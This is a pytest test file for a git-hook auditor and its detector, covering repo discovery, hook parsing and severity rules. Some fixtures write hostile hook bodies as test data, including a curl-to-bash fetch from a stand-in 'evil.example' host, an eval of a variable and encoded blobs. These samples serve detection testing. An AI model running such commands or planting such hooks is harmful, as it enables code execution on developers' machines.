"""Git hook auditor + GitHookAuditDetector tests."""

from __future__ import annotations

from pathlib import Path

from digger.core.evidence import EvidenceStore
from digger.detectors.git_hook_audit import GitHookAuditDetector
from digger.git_audit import (
    GitHookRecord,
    HOOK_NAMES,
    audit_git_repos,
    emit_records_to_store,
    parse_hook,
)
from digger.git_audit.auditor import (
    SILENT_OPERATION_HOOKS,
    _find_repos_under,
    _resolve_hooks_dir,
)


def _make_repo(parent: Path, name: str) -> Path:
    repo = parent / name
    (repo / ".git" / "hooks").mkdir(parents=True)
    (repo / ".git" / "config").write_text("[core]\n")
    return repo


def _write_hook(repo: Path, hook_name: str, body: str,
                *, executable: bool = True) -> Path:
    hook = repo / ".git" / "hooks" / hook_name
    hook.write_text(body)
    if executable:
        hook.chmod(0o755)
    else:
        hook.chmod(0o644)
    return hook


# ---- repo discovery ---- #


def test_find_repos_under_finds_root_repo(tmp_path):
    repo = _make_repo(tmp_path, "a")
    found = list(_find_repos_under(tmp_path, max_repos=10))
    # tmp_path itself isn't a repo, only `a` is.
    assert repo in found


def test_find_repos_under_finds_nested(tmp_path):
    _make_repo(tmp_path, "a")
    _make_repo(tmp_path / "deeper", "b")
    found = list(_find_repos_under(tmp_path, max_repos=10))
    assert len(found) == 2


def test_find_repos_under_skips_vendor_dirs(tmp_path):
    _make_repo(tmp_path / "node_modules", "vendor_pkg")
    _make_repo(tmp_path, "my_repo")
    found = list(_find_repos_under(tmp_path, max_repos=10))
    names = {p.name for p in found}
    assert "my_repo" in names
    assert "vendor_pkg" not in names


def test_find_repos_under_handles_missing_root(tmp_path):
    """Nothing wrong, just no repos."""
    found = list(_find_repos_under(tmp_path / "nope", max_repos=10))
    assert found == []


def test_find_repos_under_root_itself_is_repo(tmp_path):
    """When root IS a repo, yield it without scanning further."""
    repo = _make_repo(tmp_path, "x")
    found = list(_find_repos_under(repo, max_repos=10))
    assert found == [repo]


# ---- _resolve_hooks_dir ---- #


def test_resolve_hooks_dir_default(tmp_path):
    repo = _make_repo(tmp_path, "a")
    p = _resolve_hooks_dir(repo)
    assert p == repo / ".git" / "hooks"


def test_resolve_hooks_dir_custom_via_config(tmp_path):
    repo = _make_repo(tmp_path, "a")
    custom = repo / "custom_hooks"
    custom.mkdir()
    (repo / ".git" / "config").write_text(
        "[core]\nhooksPath = " + str(custom) + "\n",
    )
    p = _resolve_hooks_dir(repo)
    assert p == custom


# ---- parse_hook: clean sample hook ---- #


def test_parse_hook_sample_recognized(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\n# This is the standard git sample hook.\n# More comments.\n"
    hook = _write_hook(repo, "pre-commit", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.is_known_sample is True
    assert rec.suspicious_matches == []


def test_parse_hook_silent_operation_flag(tmp_path):
    repo = _make_repo(tmp_path, "a")
    hook = _write_hook(repo, "post-checkout", "#!/bin/sh\necho hi\n")
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.is_silent_operation_hook is True


def test_parse_hook_silent_operation_negative(tmp_path):
    repo = _make_repo(tmp_path, "a")
    hook = _write_hook(repo, "pre-commit", "#!/bin/sh\necho hi\n")
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.is_silent_operation_hook is False


# ---- parse_hook: suspicious patterns ---- #


def test_parse_hook_detects_pipe_to_shell(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\ncurl https://evil.example/x.sh | bash\n"
    hook = _write_hook(repo, "post-checkout", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_pipe_to_shell is True
    assert "pipe_to_shell" in rec.suspicious_matches


def test_parse_hook_detects_network_fetch(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\ncurl -o /tmp/x https://example.com/x\n"
    hook = _write_hook(repo, "pre-commit", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_network_fetch is True


def test_parse_hook_detects_eval_input(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = '#!/bin/sh\neval "$BRANCH"\n'
    hook = _write_hook(repo, "commit-msg", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_eval_input is True


def test_parse_hook_detects_self_modify(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\necho extra >> .git/config\n"
    hook = _write_hook(repo, "post-merge", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_self_modify is True


def test_parse_hook_detects_long_base64(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\nDATA=" + ("A" * 200) + "\n"
    hook = _write_hook(repo, "pre-push", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_long_base64 is True


def test_parse_hook_detects_long_hex_escape(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\nDATA=" + (r"\x41" * 50) + "\n"
    hook = _write_hook(repo, "pre-push", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_long_hex is True


def test_parse_hook_ignores_short_base64(tmp_path):
    repo = _make_repo(tmp_path, "a")
    body = "#!/bin/sh\nDATA=AAAA\n"
    hook = _write_hook(repo, "pre-commit", body)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.contains_long_base64 is False


def test_parse_hook_records_sha256_and_mode(tmp_path):
    repo = _make_repo(tmp_path, "a")
    hook = _write_hook(repo, "pre-commit", "#!/bin/sh\necho hi\n")
    rec = parse_hook(hook, repo_path=str(repo))
    assert len(rec.sha256) == 64
    assert rec.is_executable is True
    assert rec.size_bytes > 0


def test_parse_hook_non_executable_recorded(tmp_path):
    repo = _make_repo(tmp_path, "a")
    hook = _write_hook(repo, "pre-commit", "#!/bin/sh\necho hi\n",
                       executable=False)
    rec = parse_hook(hook, repo_path=str(repo))
    assert rec.is_executable is False


def test_parse_hook_missing_file(tmp_path):
    rec = parse_hook(tmp_path / "no.sh")
    assert rec.parse_error == "not a file"


def test_parse_hook_oversize(tmp_path, monkeypatch):
    repo = _make_repo(tmp_path, "a")
    hook = _write_hook(repo, "pre-commit", "#!/bin/sh\necho hi\n")
    monkeypatch.setattr(
        "digger.git_audit.auditor._MAX_HOOK_BYTES", 5,
    )
    rec = parse_hook(hook, repo_path=str(repo))
    assert "cap" in rec.parse_error


# ---- audit_git_repos walker ---- #


def test_audit_git_repos_audits_only_executable_hooks(tmp_path):
    repo = _make_repo(tmp_path, "a")
    _write_hook(repo, "pre-commit", "#!/bin/sh\necho hi\n")
    _write_hook(repo, "post-merge", "#!/bin/sh\necho hi\n",
                executable=False)
    recs = audit_git_repos(roots=[tmp_path])
    assert len(recs) == 1
    assert recs[0].hook_name == "pre-commit"


def test_audit_git_repos_skips_sample_files(tmp_path):
    repo = _make_repo(tmp_path, "a")
    sample = repo / ".git" / "hooks" / "pre-commit.sample"
    sample.write_text("#!/bin/sh\n")
    sample.chmod(0o755)
    recs = audit_git_repos(roots=[tmp_path])
    assert recs == []


def test_audit_git_repos_multiple_repos(tmp_path):
    a = _make_repo(tmp_path, "a")
    b = _make_repo(tmp_path / "deeper", "b")
    _write_hook(a, "pre-commit", "#!/bin/sh\necho a\n")
    _write_hook(b, "post-checkout", "#!/bin/sh\necho b\n")
    recs = audit_git_repos(roots=[tmp_path])
    names = sorted({Path(r.repo_path).name for r in recs})
    assert names == ["a", "b"]


def test_audit_git_repos_defaults_to_cwd(tmp_path, monkeypatch):
    repo = _make_repo(tmp_path, "myrepo")
    _write_hook(repo, "pre-commit", "#!/bin/sh\necho hi\n")
    monkeypatch.chdir(repo)
    recs = audit_git_repos()
    assert len(recs) == 1


# ---- emit_records_to_store ---- #


def test_emit_records_to_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        rec = GitHookRecord(
            repo_path="/x", hook_path="/x/.git/hooks/pre-commit",
            hook_name="pre-commit",
        )
        n = emit_records_to_store([rec], store)
        assert n == 1
        arts = list(store.iter_artifacts(collector="git.hook_audit",
                                          category="dev_env"))
        assert len(arts) == 1
        assert arts[0]["data"]["hook_name"] == "pre-commit"
    finally:
        store.close()


# ---- detector ---- #


def _seed(store, **kwargs):
    rec = GitHookRecord(
        repo_path="/repo",
        hook_path="/repo/.git/hooks/pre-commit",
        hook_name="pre-commit",
    )
    for k, v in kwargs.items():
        setattr(rec, k, v)
    emit_records_to_store([rec], store)


def test_detector_g1_pipe_to_shell_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_pipe_to_shell=True)
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "pipe_to_shell_in_hook"]
        assert len(f) == 1
        assert f[0].severity == "critical"
    finally:
        store.close()


def test_detector_g2_network_fetch_silent_hook_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_network_fetch=True,
              is_silent_operation_hook=True,
              hook_name="post-checkout",
              hook_path="/r/.git/hooks/post-checkout")
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "network_fetch_silent_hook"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_detector_g3_network_fetch_in_hook_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_network_fetch=True,
              is_silent_operation_hook=False)
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "network_fetch_in_hook"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


def test_detector_g2_skipped_when_pipe_to_shell_already_fired(tmp_path):
    """If pipe-to-shell fires, don't also fire the weaker net-fetch."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_pipe_to_shell=True,
              contains_network_fetch=True,
              is_silent_operation_hook=True,
              hook_name="post-checkout")
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        assert "pipe_to_shell_in_hook" in kinds
        assert "network_fetch_silent_hook" not in kinds
        assert "network_fetch_in_hook" not in kinds
    finally:
        store.close()


def test_detector_g4_eval_input_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_eval_input=True,
              hook_name="commit-msg")
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "eval_input_in_hook"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_detector_g5_self_modify_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_self_modify=True)
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "self_modify_hook"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_detector_g6_encoded_payload_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, contains_long_base64=True)
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "encoded_payload_hook"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


def test_detector_g7_silent_op_hook_info(tmp_path):
    """Clean silent-op hook fires the surface-area info finding."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, is_silent_operation_hook=True,
              hook_name="post-checkout",
              hook_path="/r/.git/hooks/post-checkout",
              is_executable=True)
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind")
             == "silent_operation_hook_present"]
        assert len(f) == 1
        assert f[0].severity == "info"
    finally:
        store.close()


def test_detector_g7_skipped_when_other_findings_fire(tmp_path):
    """If a real bad pattern fired, don't bother with the info-level
    surface-area finding."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, is_silent_operation_hook=True,
              contains_eval_input=True,
              hook_name="post-checkout")
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        assert "eval_input_in_hook" in kinds
        assert "silent_operation_hook_present" not in kinds
    finally:
        store.close()


def test_detector_known_sample_emits_nothing(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, is_known_sample=True,
              hook_name="post-checkout",
              is_silent_operation_hook=True)
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        assert findings == []
    finally:
        store.close()


def test_detector_parse_error(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store, parse_error="oversize")
        det = GitHookAuditDetector()
        findings = list(det.detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "hook_parse_error"]
        assert len(f) == 1
        assert f[0].severity == "info"
    finally:
        store.close()


def test_detector_returns_no_findings_on_empty_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        det = GitHookAuditDetector()
        assert list(det.detect(store)) == []
    finally:
        store.close()


def test_detector_registered_in_all_detectors():
    from digger.detectors import all_detectors
    names = {d.name for d in all_detectors()}
    assert "git_hook_audit" in names


def test_detector_sigma_template_has_persistence_tag():
    det = GitHookAuditDetector()
    tpl = det.to_sigma_template()
    assert tpl["id"] == "digger-git-hook-audit-template"
    assert "attack.t1546" in tpl["tags"]
    assert tpl["logsource"]["category"] == "dev_env"


def test_hook_names_includes_canonical_set():
    assert "pre-commit" in HOOK_NAMES
    assert "post-checkout" in HOOK_NAMES
    assert "pre-push" in HOOK_NAMES


def test_silent_operation_hooks_set():
    assert "post-checkout" in SILENT_OPERATION_HOOKS
    assert "post-merge" in SILENT_OPERATION_HOOKS
    assert "post-rewrite" in SILENT_OPERATION_HOOKS
    assert "pre-push" in SILENT_OPERATION_HOOKS
    assert "post-commit" in SILENT_OPERATION_HOOKS
    # pre-commit is NOT silent — operator types `git commit`.
    assert "pre-commit" not in SILENT_OPERATION_HOOKS
